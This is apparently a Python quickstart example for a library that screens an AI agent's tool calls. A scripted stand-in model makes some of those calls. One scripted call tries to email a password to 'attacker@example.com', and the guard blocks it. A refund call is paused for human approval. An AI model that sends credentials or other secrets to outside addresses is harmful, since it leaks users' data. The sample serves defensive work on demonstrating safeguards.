"""Block, allow and review tool calls with agent-framework-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
import json
from collections.abc import Awaitable, Mapping, Sequence
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from agent_framework import (
    Agent,
    AgentResponse,
    BaseChatClient,
    ChatMiddlewareLayer,
    ChatResponse,
    ChatResponseUpdate,
    Content,
    FunctionInvocationLayer,
    Message,
    ResponseStream,
)

from agent_framework_acgs import ACGSGuard


class ScriptedModel(FunctionInvocationLayer[Any], ChatMiddlewareLayer[Any], BaseChatClient[Any]):
    """Stands in for a real chat client so the example runs offline. Each turn is a list of tool calls."""

    def __init__(self, *turns: list[tuple[str, str, dict[str, Any]]]) -> None:
        super().__init__()
        self.turns = list(turns)

    def _inner_get_response(
        self, *, messages: Sequence[Message], stream: bool = False, options: Mapping[str, Any], **kwargs: Any
    ) -> Awaitable[ChatResponse] | ResponseStream[ChatResponseUpdate, ChatResponse]:
        turn = self.turns.pop(0) if self.turns else []
        calls = [Content.from_function_call(call_id=i, name=n, arguments=json.dumps(a)) for i, n, a in turn]

        async def respond() -> ChatResponse:
            return ChatResponse(messages=[Message(role="assistant", contents=calls or [Content.from_text("Done.")])])

        return respond()


def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


def print_results(response: AgentResponse[Any]) -> None:
    for message in response.messages:
        for content in message.contents:
            if content.type == "function_result":
                print(f"{content.call_id}: {content.result}")


async def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    guard = ACGSGuard(constitution=constitution)
    model = ScriptedModel(
        [
            ("email-1", "send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
            ("weather-1", "get_weather", {"city": "Paris"}),
        ],
        [],
        [("refund-1", "issue_refund", {"order_id": "A-17", "amount": 20.0})],
    )
    agent = Agent(client=model, tools=[send_email, get_weather, issue_refund], middleware=guard.middleware)

    # The blocked call is not executed; the model reads why. The allowed call runs.
    print_results(await agent.run("Email the password, then check the weather in Paris."))

    # A call that needs review pauses the run with a tool approval request.
    session = agent.create_session()
    paused = await agent.run("Refund order A-17.", session=session)
    for request in paused.user_input_requests:
        print(f"paused: {request.function_call.name}: {request.additional_properties['reason']}")  # type: ignore[union-attr]
    approvals = [request.to_function_approval_response(approved=True) for request in paused.user_input_requests]
    print_results(await agent.run(Message(role="user", contents=approvals), session=session))


if __name__ == "__main__":
    asyncio.run(main())
